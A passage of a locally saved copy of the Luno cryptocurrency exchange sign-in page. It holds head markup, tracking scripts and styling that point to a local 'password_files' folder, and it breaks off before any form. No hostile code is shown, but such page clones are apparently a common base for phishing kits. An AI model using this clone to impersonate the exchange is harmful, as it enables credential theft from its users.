<!DOCTYPE html>
<!-- saved from url=(0029)https://www.luno.com/en/login -->
<html lang="en" class="best_trip best-trip"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
<title>Sign in | Luno</title>





<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="referrer" content="origin-when-cross-origin">

<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-152x152.png">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-120x120.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-72x72.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-16x16.png">
<meta name="theme-color" content="#12326B">

<meta name="mobile-web-app-capable" content="yes">
<link rel="icon" sizes="192x192" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-152x152.png">

<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="apple-mobile-web-app-title" content="Luno Website">
<link rel="apple-touch-icon-precomposed" href="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-152x152.png">

<meta name="msapplication-TileImage" content="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/favicon-144x144.png">
<meta name="msapplication-TileColor" content="#12326B">


<link canonical-tag="" rel="canonical" href="https://www.luno.com/en/login">

<link rel="alternate" hreflang="x-default" href="https://www.luno.com/login">
<link rel="alternate" hreflang="en" href="https://www.luno.com/en/login">
<link rel="alternate" hreflang="fr" href="https://www.luno.com/fr/login">
<link rel="alternate" hreflang="id" href="https://www.luno.com/id/login">
<link rel="alternate" hreflang="it" href="https://www.luno.com/it/login">


<meta name="description" content="Welcome back to Luno! Log in to your account to send, receive, buy or sell Bitcoin.">


<meta property="og:locale" content="en">
<meta property="og:type" content="website">
<meta property="og:title" content="Sign in | Luno">


<meta property="og:site_name" content="Luno">
<meta property="og:image" content="https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22/website/common/img/default_og_image.png">



<link rel="stylesheet" href="./password_files/website.min.css">










    
<link href="./password_files/css" rel="stylesheet">

    <link href="./password_files/icon" rel="stylesheet">
  <script src="./password_files/va-00c1ac5a48b465c6a99ec3e484db4f15.js.download" crossorigin="anonymous" type="text/javascript"></script><script src="./password_files/track-00c1ac5a48b465c6a99ec3e484db4f15.js.download" crossorigin="anonymous" type="text/javascript"></script><script src="./password_files/opa-25adb811d1e86adb05fb1ed94f611a9d.js.download" crossorigin="anonymous" type="text/javascript"></script><script id="adroll_scr_exp" onerror="window.adroll_exp_list = [];" type="text/javascript" src="./password_files/index.js.download"></script><script type="text/javascript" src="./password_files/DN7MGSCFYVCP5O5VG6AWM4"></script><script async="true" type="text/javascript" src="./password_files/MXXDHVXQWVACJD4VWOM6NP"></script><div style="width: 1px; height: 1px; display: inline; position: absolute;"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(1)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(2)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(3)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(4)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(5)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(6)"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(7)"></div><script type="text/javascript" src="./password_files/sendrolling.js.download"></script><div style="width: 1px; height: 1px; display: inline; position: absolute;"><img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(8)">
<img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(9)">
<img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(10)">
<img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(11)">
<img height="1" width="1" style="border-style:none;" alt="" src="./password_files/out(12)">
</div><style>h1[_ngcontent-c0]{font-size:56px!important;line-height:56px!important}h2[_ngcontent-c0]{font-size:48px!important;line-height:48px!important}h3[_ngcontent-c0]{font-size:40px!important;line-height:40px!important}h4[_ngcontent-c0]{font-size:32px!important;line-height:32px!important}h5[_ngcontent-c0]{font-size:26px!important;line-height:26px!important}h6[_ngcontent-c0]{font-size:18px!important;line-height:18px!important}h1[_ngcontent-c0], h2[_ngcontent-c0], h3[_ngcontent-c0], h4[_ngcontent-c0], h5[_ngcontent-c0], h6[_ngcontent-c0]{font-family:Greycliff,"Helvetica Neue",Helvetica,Arial,sans-serif!important;font-weight:400;margin:8px 0 24px}input[_ngcontent-c0], label[_ngcontent-c0], li[_ngcontent-c0], p[_ngcontent-c0]{font-size:18px;line-height:22px}.ln-account-body[_ngcontent-c0]   .ln-account-wrapper[_ngcontent-c0]{font-family:Roboto,"Open Sans",sans-serif}@media only screen and (max-width:992px){h1[_ngcontent-c0]{font-size:40px!important;line-height:40px!important}h2[_ngcontent-c0]{font-size:36px!important;line-height:36px!important}h3[_ngcontent-c0]{font-size:32px!important;line-height:32px!important}h4[_ngcontent-c0]{font-size:28px!important;line-height:28px!important}h5[_ngcontent-c0]{font-size:22px!important;line-height:22px!important}h6[_ngcontent-c0]{font-size:18px!important;line-height:18px!important}.desktop-only[_ngcontent-c0]{display:none}}@media only screen and (min-width:993px){.mobile-only[_ngcontent-c0]{display:none}}.border-bottom[_ngcontent-c0]{border-bottom:2px solid #bdbdbd;margin:0 auto}.grey-background[_ngcontent-c0]{background-color:#f2f2f2}.white-background[_ngcontent-c0]{background-color:#fff}.transition[_ngcontent-c0]{transition:.2s ease-in-out}.carousel[_ngcontent-c0]   .content[_ngcontent-c0]{display:flex}.carousel[_ngcontent-c0]   .content[_ngcontent-c0]   .item[_ngcontent-c0]{width:100%;display:block;opacity:0}.carousel[_ngcontent-c0]   .content[_ngcontent-c0]   .item.visible[_ngcontent-c0]{opacity:1}.carousel[_ngcontent-c0]   ul.indicators[_ngcontent-c0]{position:relative!important}.carousel[_ngcontent-c0]   .ball[_ngcontent-c0]{width:10px;height:10px;border-radius:50%;border:none;opacity:.5;background:#bdbdbd}.carousel[_ngcontent-c0]   .ball.visible[_ngcontent-c0]{opacity:1;background:#0091ff}.job-description[_ngcontent-c0]   h2[_ngcontent-c0]{font-size:36px!important;line-height:1.2!important;font-weight:400;color:#12326b;margin:25px auto}.job-description[_ngcontent-c0]   h2[_ngcontent-c0]:first-child{margin:0 auto 25px}.job-description[_ngcontent-c0]   h3[_ngcontent-c0]{font-size:24px!important;line-height:1.6!important;font-weight:400;color:#12326b;margin:25px auto}.global-bttc[_ngcontent-c0]   .careers-wrapper[_ngcontent-c0]   a[_ngcontent-c0], .global-bttc[_ngcontent-c0]   h1[_ngcontent-c0], .global-bttc[_ngcontent-c0]   h2[_ngcontent-c0], .global-bttc[_ngcontent-c0]   h5[_ngcontent-c0]{font-weight:800!important}.global-bttc[_ngcontent-c0]   .careers-wrapper[_ngcontent-c0]   .careers-footer[_ngcontent-c0]   .careers-footer-links[_ngcontent-c0]   ul[_ngcontent-c0]   li[_ngcontent-c0]{line-height:32px}.global-bttc[_ngcontent-c0]   .careers-wrapper[_ngcontent-c0]   .careers-footer[_ngcontent-c0]   .careers-footer-links[_ngcontent-c0]   ul[_ngcontent-c0]   a[_ngcontent-c0]{font-weight:500!important}.global-bttc[_ngcontent-c0]   .nav-bar__block[_ngcontent-c0]{text-transform:uppercase;font-weight:800}.global-bttc[_ngcontent-c0]   .nav-bar__block--cta-button[_ngcontent-c0]{background:#0091ff;border-radius:24px;border:none;padding:13px 30px}.global-bttc[_ngcontent-c0]   .opaque[_ngcontent-c0]   .nav-bar__block[_ngcontent-c0]   .nav-item[_ngcontent-c0]{color:#12326b!important}.global-bttc[_ngcontent-c0]   .opaque[_ngcontent-c0]   .nav-bar__block--cta-button[_ngcontent-c0]{border-radius:24px!important}.global-bttc[_ngcontent-c0]   .careers-footer[_ngcontent-c0]   h6[_ngcontent-c0]{font-weight:800!important;color:#12326b!important}.global-bttc[_ngcontent-c0]   .careers-footer[_ngcontent-c0]   li[_ngcontent-c0]{font-weight:500}.global-bttc[_ngcontent-c0]   .header-section[_ngcontent-c0]{background-image:none!important}.global-bttc[_ngcontent-c0]   .header-section--block[_ngcontent-c0]   h1[_ngcontent-c0], .global-bttc[_ngcontent-c0]   .header-section--block[_ngcontent-c0]   h5[_ngcontent-c0]{font-weight:800}.global-bttc[_ngcontent-c0]   .header-section--block[_ngcontent-c0]   h5[_ngcontent-c0]{font-weight:500!important;opacity:1}.global-bttc[_ngcontent-c0]   .header-section--block[_ngcontent-c0]   .mat-raised-button[_ngcontent-c0]{font-weight:800;border-radius:24px;text-transform:uppercase;padding:0 60px}.global-bttc[_ngcontent-c0]   .cta-block[_ngcontent-c0]{background-image:none!important}.global-bttc[_ngcontent-c0]   .cta-block__button[_ngcontent-c0]{border-radius:24px!important;padding:0 80px;height:48px;font-weight:800;text-transform:uppercase}.global-bttc[_ngcontent-c0]   .careers-block__header[_ngcontent-c0]   h2[_ngcontent-c0]{font-weight:500!important;opacity:1}.global-bttc[_ngcontent-c0]   .careers-block__cta-button--accent[_ngcontent-c0]{border-radius:30px;text-transform:uppercase;font-weight:800;min-width:328px}.global-bttc[_ngcontent-c0]   .mat-form-field-flex[_ngcontent-c0]{min-height:62px}.global-bttc[_ngcontent-c0]   .offices--wrap--block[_ngcontent-c0], .global-bttc[_ngcontent-c0]   .team-card[_ngcontent-c0]{border-radius:8px!important}.global-bttc[_ngcontent-c0]   .offices--wrap--block--icon[_ngcontent-c0]{border-top-left-radius:8px;border-top-right-radius:8px}  .currency-wrapper-option span.mat-option-text{font-size:16px;color:#12326b}  .currency-wrapper-option.mat-selected span.mat-option-text{font-weight:800}  .currency-wrapper-option span.mat-option-text span{float:right}  mat-nav-list{font-family:Greycliff,"Helvetica Neue",Helvetica,Arial,sans-serif}</style><style>.ln-account-secondary-actions[_ngcontent-c1]   a[_ngcontent-c1]{cursor:pointer}.ln-account-inner[_ngcontent-c1]{margin-top:10px;background:#fff;border-radius:5px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12);display:block}.ln-account-inner.phishing-warning[_ngcontent-c1]{padding:15px;font-size:14px;line-height:16px}.ln-account-inner.phishing-warning[_ngcontent-c1]   h3[_ngcontent-c1]{margin:10px 0;color:#12326b;font-size:16px;line-height:18px}.ln-account-inner.phishing-warning[_ngcontent-c1]   p[_ngcontent-c1]{text-align:left;margin:8px 0;font-size:14px;line-height:16px}.ln-account-inner.phishing-warning[_ngcontent-c1]   img[_ngcontent-c1]{padding:7px 0}.ln-account-inner.phishing-warning[_ngcontent-c1]   .learn-more-wrapper[_ngcontent-c1]{text-align:right}.ln-account-inner.phishing-warning[_ngcontent-c1]   a[_ngcontent-c1]{padding:10px;cursor:pointer;font-size:14px;line-height:16px;font-weight:400;text-transform:uppercase}</style><style>.bttc-container[_ngcontent-c2]   button[_ngcontent-c2]{margin-bottom:32px!important}.bttc-container[_ngcontent-c2]   .oauth-signin-text[_ngcontent-c2]{color:#12326b;font-size:14px;text-align:center;margin-bottom:0!important}</style><style>[_nghost-c8]{overflow:hidden;display:block;padding-top:24px;margin:0 auto 20px}.narrow[_nghost-c8]{max-width:540px}@media only screen and (max-width:480px){[_nghost-c8]{padding-top:16px}}</style><style>.mat-card{transition:box-shadow 280ms cubic-bezier(.4,0,.2,1);display:block;position:relative;padding:24px;border-radius:2px}.mat-card:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}.mat-card .mat-divider-horizontal{position:absolute;left:0;width:100%}[dir=rtl] .mat-card .mat-divider-horizontal{left:auto;right:0}.mat-card .mat-divider-horizontal.mat-divider-inset{position:static;margin:0}[dir=rtl] .mat-card .mat-divider-horizontal.mat-divider-inset{margin-right:0}.mat-card.mat-card-flat{box-shadow:none}@media screen and (-ms-high-contrast:active){.mat-card{outline:solid 1px}}.mat-card-actions,.mat-card-content,.mat-card-subtitle,.mat-card-title{display:block;margin-bottom:16px}.mat-card-actions{margin-left:-16px;margin-right:-16px;padding:8px 0}.mat-card-actions-align-end{display:flex;justify-content:flex-end}.mat-card-image{width:calc(100% + 48px);margin:0 -24px 16px -24px}.mat-card-footer{display:block;margin:0 -24px -24px -24px}.mat-card-actions .mat-button,.mat-card-actions .mat-raised-button{margin:0 4px}.mat-card-header{display:flex;flex-direction:row}.mat-card-header-text{margin:0 8px}.mat-card-avatar{height:40px;width:40px;border-radius:50%;flex-shrink:0}.mat-card-lg-image,.mat-card-md-image,.mat-card-sm-image,.mat-card-title-group>.mat-card-xl-image{margin:-8px 0 8px 0}.mat-card-title-group{display:flex;justify-content:space-between;margin:0 -8px}.mat-card-sm-image{width:80px;height:80px}.mat-card-md-image{width:112px;height:112px}.mat-card-lg-image{width:152px;height:152px}.mat-card-xl-image{width:240px;height:240px;margin:-8px}@media (max-width:599px){.mat-card{padding:24px 16px}.mat-card-actions{margin-left:-8px;margin-right:-8px}.mat-card-image{width:calc(100% + 32px);margin:16px -16px}.mat-card-title-group{margin:0}.mat-card-xl-image{margin-left:0;margin-right:0}.mat-card-header{margin:-8px 0 0 0}.mat-card-footer{margin-left:-16px;margin-right:-16px}}.mat-card-content>:first-child,.mat-card>:first-child{margin-top:0}.mat-card-content>:last-child:not(.mat-card-footer),.mat-card>:last-child:not(.mat-card-footer){margin-bottom:0}.mat-card-image:first-child{margin-top:-24px}.mat-card>.mat-card-actions:last-child{margin-bottom:-16px;padding-bottom:0}.mat-card-actions .mat-button:first-child,.mat-card-actions .mat-raised-button:first-child{margin-left:0;margin-right:0}.mat-card-subtitle:not(:first-child),.mat-card-title:not(:first-child){margin-top:-4px}.mat-card-header .mat-card-subtitle:not(:first-child){margin-top:-8px}.mat-card>.mat-card-xl-image:first-child{margin-top:-8px}.mat-card>.mat-card-xl-image:last-child{margin-bottom:-8px}</style><style>.mat-form-field{width:100%}.mat-form-field-appearance-outline .mat-form-field-outline,input.mat-input-element{color:#12326b;caret-color:#12326b}.input-mat-hint{color:#12326b}.mat-form-field-invalid .input-mat-hint{color:#d50000}.input-label{color:#12326b}.input-mat-icon{color:#757575;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}input[type=number]{-moz-appearance:textfield}.input-action-copy{display:inline-block;height:26px;margin-top:-9px;padding:4px 6px;line-height:1.33;font-size:12px;background-color:#f2f2f2;border-radius:4px;text-align:center;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}</style><style>.mat-button,.mat-flat-button,.mat-icon-button,.mat-stroked-button{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible}.mat-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner{border:0}.mat-button[disabled],.mat-flat-button[disabled],.mat-icon-button[disabled],.mat-stroked-button[disabled]{cursor:default}.mat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-button.cdk-program-focused .mat-button-focus-overlay,.mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-flat-button.cdk-program-focused .mat-button-focus-overlay,.mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-icon-button.cdk-program-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner{border:0}.mat-button .mat-button-focus-overlay,.mat-icon-button .mat-button-focus-overlay{opacity:0}.mat-button:hover .mat-button-focus-overlay,.mat-stroked-button:hover .mat-button-focus-overlay{opacity:1}@media (hover:none){.mat-button:hover .mat-button-focus-overlay,.mat-stroked-button:hover .mat-button-focus-overlay{opacity:0}}.mat-raised-button{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1)}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button[disabled]{cursor:default}.mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-raised-button.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-raised-button{transition:none;animation:none}.mat-raised-button:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-raised-button[disabled]{box-shadow:none}.mat-stroked-button{border:1px solid currentColor;padding:0 15px;line-height:34px}.mat-stroked-button:not([class*=mat-elevation-z]){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.mat-flat-button:not([class*=mat-elevation-z]){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.mat-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1);min-width:0;border-radius:50%;width:56px;height:56px;padding:0;flex-shrink:0}.mat-fab::-moz-focus-inner{border:0}.mat-fab[disabled]{cursor:default}.mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-fab.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-fab::-moz-focus-inner{border:0}.mat-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-fab{transition:none;animation:none}.mat-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-fab[disabled]{box-shadow:none}.mat-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)}.mat-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)}.mat-fab .mat-button-wrapper{padding:16px 0;display:inline-block;line-height:24px}.mat-mini-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;outline:0;border:none;-webkit-tap-highlight-color:transparent;display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:88px;line-height:36px;padding:0 16px;border-radius:2px;overflow:visible;transform:translate3d(0,0,0);transition:background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1);min-width:0;border-radius:50%;width:40px;height:40px;padding:0;flex-shrink:0}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab[disabled]{cursor:default}.mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-mini-fab.cdk-program-focused .mat-button-focus-overlay{opacity:1}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}._mat-animation-noopable.mat-mini-fab{transition:none;animation:none}.mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.mat-mini-fab[disabled]{box-shadow:none}.mat-mini-fab:not([class*=mat-elevation-z]){box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)}.mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]){box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)}.mat-mini-fab .mat-button-wrapper{padding:8px 0;display:inline-block;line-height:24px}.mat-icon-button{padding:0;min-width:0;width:40px;height:40px;flex-shrink:0;line-height:40px;border-radius:50%}.mat-icon-button .mat-icon,.mat-icon-button i{line-height:24px}.mat-button-focus-overlay,.mat-button-ripple{top:0;left:0;right:0;bottom:0;position:absolute;pointer-events:none;border-radius:inherit}.mat-button-focus-overlay{background-color:rgba(0,0,0,.12);border-radius:inherit;opacity:0;transition:opacity .2s cubic-bezier(.35,0,.25,1),background-color .2s cubic-bezier(.35,0,.25,1)}._mat-animation-noopable .mat-button-focus-overlay{transition:none}@media screen and (-ms-high-contrast:active){.mat-button-focus-overlay{background-color:rgba(255,255,255,.5)}}.mat-button-ripple-round{border-radius:50%;z-index:1}.mat-button .mat-button-wrapper>*,.mat-fab .mat-button-wrapper>*,.mat-flat-button .mat-button-wrapper>*,.mat-icon-button .mat-button-wrapper>*,.mat-mini-fab .mat-button-wrapper>*,.mat-raised-button .mat-button-wrapper>*,.mat-stroked-button .mat-button-wrapper>*{vertical-align:middle}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button{display:block;font-size:inherit;width:2.5em;height:2.5em}@media screen and (-ms-high-contrast:active){.mat-button,.mat-fab,.mat-flat-button,.mat-icon-button,.mat-mini-fab,.mat-raised-button{outline:solid 1px}}</style><style>.oauth-actions[_ngcontent-c12]{display:flex;justify-content:space-between;padding-top:16px}.oauth-actions[_ngcontent-c12]   .mat-secondary[_ngcontent-c12]{width:48%!important;border:1px solid #12326b;outline:0;text-transform:none;font-weight:400;color:#12326b!important;text-decoration:none}.oauth-actions[_ngcontent-c12]   .mat-secondary[_ngcontent-c12]     .mat-button-wrapper{display:flex;align-items:center;justify-content:left}.oauth-actions[_ngcontent-c12]   .mat-secondary[_ngcontent-c12]   .inner-text[_ngcontent-c12]{width:100%;color:#12326b;text-align:center;text-transform:none;font-weight:600}</style><style>.mat-form-field{display:inline-block;position:relative;text-align:left}[dir=rtl] .mat-form-field{text-align:right}.mat-form-field-wrapper{position:relative}.mat-form-field-flex{display:inline-flex;align-items:baseline;box-sizing:border-box;width:100%}.mat-form-field-prefix,.mat-form-field-suffix{white-space:nowrap;flex:none;position:relative}.mat-form-field-infix{display:block;position:relative;flex:auto;min-width:0;width:180px}@media screen and (-ms-high-contrast:active){.mat-form-field-infix{border-image:linear-gradient(transparent,transparent)}}.mat-form-field-label-wrapper{position:absolute;left:0;box-sizing:content-box;width:100%;height:100%;overflow:hidden;pointer-events:none}.mat-form-field-label{position:absolute;left:0;font:inherit;pointer-events:none;width:100%;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;transform-origin:0 0;transition:transform .4s cubic-bezier(.25,.8,.25,1),color .4s cubic-bezier(.25,.8,.25,1),width .4s cubic-bezier(.25,.8,.25,1);display:none}[dir=rtl] .mat-form-field-label{transform-origin:100% 0;left:auto;right:0}.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,.mat-form-field-empty.mat-form-field-label{display:block}.mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:block;transition:none}.mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:block}.mat-form-field-label:not(.mat-form-field-empty){transition:none}.mat-form-field-underline{position:absolute;width:100%;pointer-events:none;transform:scaleY(1.0001)}.mat-form-field-ripple{position:absolute;left:0;width:100%;transform-origin:50%;transform:scaleX(.5);opacity:0;transition:background-color .3s cubic-bezier(.55,0,.55,.2)}.mat-form-field.mat-focused .mat-form-field-ripple,.mat-form-field.mat-form-field-invalid .mat-form-field-ripple{opacity:1;transform:scaleX(1);transition:transform .3s cubic-bezier(.25,.8,.25,1),opacity .1s cubic-bezier(.25,.8,.25,1),background-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-subscript-wrapper{position:absolute;box-sizing:border-box;width:100%;overflow:hidden}.mat-form-field-label-wrapper .mat-icon,.mat-form-field-subscript-wrapper .mat-icon{width:1em;height:1em;font-size:inherit;vertical-align:baseline}.mat-form-field-hint-wrapper{display:flex}.mat-form-field-hint-spacer{flex:1 0 1em}.mat-error{display:block}.mat-form-field._mat-animation-noopable .mat-form-field-label,.mat-form-field._mat-animation-noopable .mat-form-field-ripple{transition:none}</style><style>.mat-form-field-appearance-fill .mat-form-field-flex{border-radius:4px 4px 0 0;padding:.75em .75em 0 .75em}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-flex{outline:solid 1px}}.mat-form-field-appearance-fill .mat-form-field-underline::before{content:'';display:block;position:absolute;bottom:0;height:1px;width:100%}.mat-form-field-appearance-fill .mat-form-field-ripple{bottom:0;height:2px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}.mat-form-field-appearance-fill .mat-form-field-subscript-wrapper{padding:0 1em}</style><style>.mat-form-field-appearance-legacy .mat-form-field-label{transform:perspective(100px);-ms-transform:none}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon{width:1em}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button{font:inherit;vertical-align:baseline}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon{font-size:inherit}.mat-form-field-appearance-legacy .mat-form-field-underline{height:1px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-legacy .mat-form-field-ripple{top:0;height:2px;overflow:hidden}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) 